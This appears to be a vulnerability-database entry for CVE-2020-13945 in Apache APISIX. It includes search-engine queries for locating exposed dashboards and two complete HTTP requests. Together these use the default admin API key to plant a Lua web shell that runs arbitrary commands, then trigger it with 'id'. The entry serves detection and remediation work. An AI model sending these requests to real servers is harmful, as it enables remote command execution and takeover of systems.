---
layout: post
cve_id: CVE-2020-13945
title: Apache APISIX - Insufficiently Protected Credentials
pcap: true
pcap_path: /pcaps/2020/CVE-2020-13945.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-13945.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdteam
severity: medium
impact: 'The vulnerability could result in unauthorized access to sensitive information,
  leading to potential data breaches or unauthorized actions.

  '
remediation: 'Upgrade to the latest version of Apache APISIX, which includes a fix
  for the vulnerability. Additionally, ensure that sensitive credentials are properly
  protected and stored securely.

  '
reference:
- https://github.com/vulhub/vulhub/tree/master/apisix/CVE-2020-13945
- https://lists.apache.org/thread.html/r792feb29964067a4108f53e8579a1e9bd1c8b5b9bc95618c814faf2f%40%3Cdev.apisix.apache.org%3E
- http://packetstormsecurity.com/files/166228/Apache-APISIX-Remote-Code-Execution.html
- https://nvd.nist.gov/vuln/detail/CVE-2020-13945
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 6.5
  cve-id: CVE-2020-13945
  cwe-id: CWE-522
  epss-score: 0.93434
  epss-percentile: 0.99807
  cpe: cpe:2.3:a:apache:apisix:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: apache
  product: apisix
  shodan-query: http.title:"apache apisix dashboard"
  fofa-query: title="apache apisix dashboard"
  google-query: intitle:"apache apisix dashboard"
tags:
- cve2020
- cve
- intrusive
- vulhub
- packetstorm
- apache
- apisix
- vuln
---

## üîç Vulnerability Description
Apache APISIX 1.2, 1.3, 1.4, and 1.5 is susceptible to insufficiently protected credentials. An attacker can enable the Admin API and delete the Admin API access IP restriction rules. Eventually, the default token is allowed to access APISIX management data.

## üåê HTTP Request
```nohighlight
POST /apisix/admin/routes HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1
Connection: close
Content-Length: 406
Content-Type: application/json
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Accept-Encoding: gzip
{
"uri":"/38FQokf5GC7mh5kPf247Z4TRkkk",
"script":"local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f =        assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
"upstream":{
"type":"roundrobin",
"nodes":{
"interact.sh:80":1
}
}
}
```

```nohighlight
GET /38FQokf5GC7mh5kPf247Z4TRkkk?cmd=id HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

